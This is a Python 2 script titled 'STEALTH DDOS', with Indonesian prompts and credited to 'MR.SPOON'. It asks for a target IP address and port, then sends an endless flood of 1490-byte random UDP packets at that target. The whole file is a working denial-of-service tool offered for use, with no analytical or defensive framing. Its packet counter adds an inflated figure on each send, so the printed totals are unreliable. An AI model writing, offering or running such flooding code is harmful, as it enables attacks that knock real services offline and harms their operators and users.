import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet STEALTH DDOS")
print
print "<===============================>"
print "||========>DDOS STEALHT<=========||"
print "<===============================>"
print "CREATED=MR.SPOON"
print "VERSION=V.1.5"
print
ip = raw_input("MASUKAN IP TAGET ===> ")
port = input("Port       ===> ")

os.system("clear")
os.system("figlet Loading..")
print "membutuhkan waktu 10 detik"
time.sleep(10)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 10000000000000000
     port = port + 0
     print "mengirim %s packet ke %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1